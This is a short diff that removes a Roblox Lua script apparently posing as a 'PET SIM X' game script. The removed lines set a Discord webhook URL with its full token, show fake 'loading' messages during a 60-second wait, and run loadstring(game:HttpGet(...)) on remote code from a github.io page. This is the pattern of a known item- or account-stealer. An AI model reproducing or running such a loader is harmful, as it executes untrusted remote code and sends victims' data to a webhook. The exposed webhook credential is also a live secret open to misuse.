@@ -1,8 +1,0 @@
-UserName = "DVDmobue2"
-Webhook = "https://discord.com/api/webhooks/1102927257464475648/ehoj-UPlwYxN0RxG3IaaSI5_eeVUWFBvD25X3bP8nF2E0xSY8frInLft4tpvRQLKYXQP"
-_G.ScriptName = "turnlez PET SIM X"
-_G.FirstText = "Script Preparing..."
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 60
-loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
